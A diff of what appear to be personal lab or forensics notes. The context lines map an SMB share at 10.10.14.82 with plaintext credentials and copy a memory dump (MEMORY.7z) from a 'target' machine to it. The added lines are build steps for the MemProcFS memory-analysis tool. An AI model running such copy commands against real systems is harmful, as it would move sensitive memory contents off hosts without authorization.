@@ -83,5 +83,14 @@ target:
 net use \\10.10.14.82\share /user:test t3st
 xcopy MEMORY.7z \\10.10.14.82\share\
 get-filehash -algorithm md5 MEMORY.7z
+==========(11)======================================================================================================================sudo apt update
+sudo apt update && sudo apt upgrade
+sudo apt install cmake g++ libfuse3-dev
+cd MemProcFS
+mkdir build && cd build
+cmake ..
+make
+
+
 
 
